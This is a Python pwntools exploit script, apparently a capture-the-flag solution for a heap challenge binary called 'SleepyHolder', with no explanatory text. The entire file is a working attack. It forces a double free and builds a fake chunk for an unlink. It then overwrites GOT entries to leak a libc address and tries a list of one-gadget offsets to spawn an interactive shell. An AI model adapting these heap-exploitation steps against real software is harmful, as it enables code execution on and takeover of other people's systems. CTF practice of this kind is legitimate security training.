from pwn import *
gadgets=[0x4526a,0xcd0f3,0xcd1c8,0xf02a4,0xf02b0,0xf1147,0xf66f0,0x45216]
for gadget in gadgets:
	target=process('./SleepyHolder')
	elf=ELF('./SleepyHolder')
	libc=elf.libc

	def init(option):
		print(target.recvuntil("Renew secret\n"))
		target.sendline(str(option))
		
	def calloc(option,payload):
		init(1)
		print(target.recv())
		target.sendline(str(option))
		print(target.recvline())
		target.send(payload)

	def free(option):
		init(2)
		print(target.recvlines(3))
		target.sendline(str(option))

	def edit(option,payload):
		init(3)
		print(target.recvlines(3))
		target.sendline(str(option))
		print(target.recvline())
		target.send(payload)

	calloc(1,"A\n")
	calloc(2,"A\n")
	free(1)
	calloc(3,"A\n")
	free(1)
	tar=0x6020d0
	fake=p64(0)+p64(0x20)+p64(tar-0x18)+p64(tar-0x10)+p64(0x20)
	calloc(1,fake)
	free(2)
	freegot=0x602018
	putsgot=0x602020
	putsplt=0x400760
	atoigot=0x602080
	edit(1,"A"*8+p64(freegot)+"A"*8+p64(atoigot)+p32(1)+p32(1))
	edit(2,p64(putsplt)+p64(putsplt+6)+"\n")
	free(1)
	leak=(target.recv())[0:6]
	libc_atoi=u64(leak+"\x00"*2)
	libc_base=libc_atoi-libc.symbols["atoi"]
	libc_gadget=libc_base+gadget
	print(hex(libc_base))
	target.sendline(str(3))
	print(target.recvlines(3))	
	target.sendline(str(2))
	print(target.recvline())
	target.sendline(p64(libc_gadget)*24)
	target.interactive()
		
	
